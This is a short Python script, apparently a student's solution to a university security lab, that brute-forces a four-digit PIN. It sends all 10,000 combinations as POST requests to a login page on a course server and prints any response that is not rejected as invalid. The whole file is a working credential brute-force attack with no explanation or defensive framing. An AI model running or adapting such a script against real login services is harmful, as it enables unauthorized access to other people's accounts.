import requests

def giveItAGo(pinNum):
    with requests.post('http://cs2.seattleu.edu:10710/login16', data={'pin': pinNum}) as r:
        if r.text.find("Invalid") == -1:
            print(r.text)


for i in range(10):
    for j in range(10):
        for k in range(10):
            for l in range(10):
                pin = str(i)+str(j)+str(k)+str(l)
                giveItAGo(pin)